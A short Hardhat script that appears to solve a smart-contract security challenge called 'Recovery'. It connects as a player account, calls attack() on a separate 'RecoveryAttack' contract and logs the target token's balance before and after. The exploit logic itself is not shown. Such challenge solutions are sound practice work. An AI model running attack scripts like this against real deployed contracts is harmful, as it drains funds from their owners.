import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x763e69d24a03c0c8B256e470D9fE9e0753504D07"
const PLAYER_ADDRESS = "0xBcd4042DE499D14e55001CcbB24a551F3b954096"
const ATTACK_ADDRESS = "0x8e464c0fCbDecE612b935C57A16105e639759eD8"

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS)
  const contract = await ethers.getContractAt("Recovery", CONTRACT_ADDRESS, signer)
  const attackContract = await ethers.getContractAt("RecoveryAttack", ATTACK_ADDRESS, signer)

  const token = await attackContract.token()
  console.log(await ethers.provider.getBalance(token))
  await attackContract.attack()
  console.log(await ethers.provider.getBalance(token))
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
